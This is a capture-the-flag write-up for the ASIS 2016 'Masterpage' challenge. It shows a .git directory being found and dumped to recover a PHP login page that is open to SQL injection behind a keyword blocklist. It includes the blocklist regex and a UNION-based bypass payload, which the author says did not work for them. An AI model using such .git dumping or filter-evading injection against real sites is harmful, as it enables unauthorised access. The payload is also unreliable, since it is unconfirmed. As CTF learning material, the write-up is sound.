# Masterpage writeup SQLi

### Description
We pwned ciphers and web services.. Yet we found another administration page which is now locked.. can you access this page?

### Solution
This solution is inspired by [link](http://corb3nik.github.io/asis%20finals%202016/masterpage/)
`pirate$ dirb https://masterpage.asis-ctf.ir/` and we get `https://masterpage.asis-ctf.ir/.git/HEAD (CODE:200|SIZE:23)`, looks like they forgot to remove .git, so reverse .git directory to extract the last commit.

I found an interesting read about to get the source code from .git directory:[link](https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/). 
Get their script from [github](https://github.com/internetwache/GitTools), fix the curl request cause CloudFlare forbid the default user-agent of many tools(add --user-agent anon to curl in the dumper script, see the inspirational link for more detail) and extract the source code of index.php:
```
<?php
    error_reporting(7);

    /* create table admin(id varchar(255), pw varchar(255), ip varchar(255)); */
    /* get flag */
    require('config.php');
    global $mysql;

    $id = $mysql->filter($_POST['user'], "auth");
    $pw = $mysql->filter($_POST['pass'], "pass"); <-- FAKE filtering
    $ip = $mysql->filter($_SERVER['REMOTE_ADDR'], "hash"); <-- FAKE filtering

    /* resolve ip addr. */
    $dns = dns_get_record(gethostbyaddr($ip));
    $ip = ($dns) ? print_r($dns, true) : ($ip);

    /* mysql filtration */
    $filter = "_|information|schema|con|\_|ha|b|x|f|@|\"|`|admin|cas|txt|sleep|benchmark|procedure|\^";
    foreach($_POST as $_VAR){
        if(preg_match("/{$filter}/i", $_VAR) || preg_match("/{$filter}/i", $ip))
        {
            exit("Blocked!");
        }
    }
    if(strlen($id.$pw.$ip) >= 1024 || substr_count("(", $id.$pw.$ip) > 2)
    {
        exit("Too Long!");
    }

    /* admin auth */
    $query = "SELECT id, pw FROM admin WHERE id='{$id}' AND pw='{$pw}' AND ip='{$ip}';";
    $result = $mysql->query($query, 1);
    if($result['id'] === "admin" && $result['pw'] === $_POST['pw'])
    {
        echo $flag."<HR>";
    }

    echo "<HR>";
    echo "<h1>Please login.</h1><form method=POST><input type=text placeholder=username name=user>&nbsp;<input type=password placeholder=password name=pass><input type=submit name=submit>";
    echo "<HR>";

    //highlight_file(__FILE__);
?>
```

There are two possible approach(unfortunaly the first i cannot try cause i have not a domain, and the second was unfruitful...):
1. Set the SQLi as payload of TXT record of our domain and make a GET request to evade the filter on POST parameters;
2. Evade the second filter with this payload:
`user=&pass=' UNION SELECT INSERT ('aa',2,1,'dmin'),0 %23&pw=0` that return only one row with the id for admin and pw = 0.


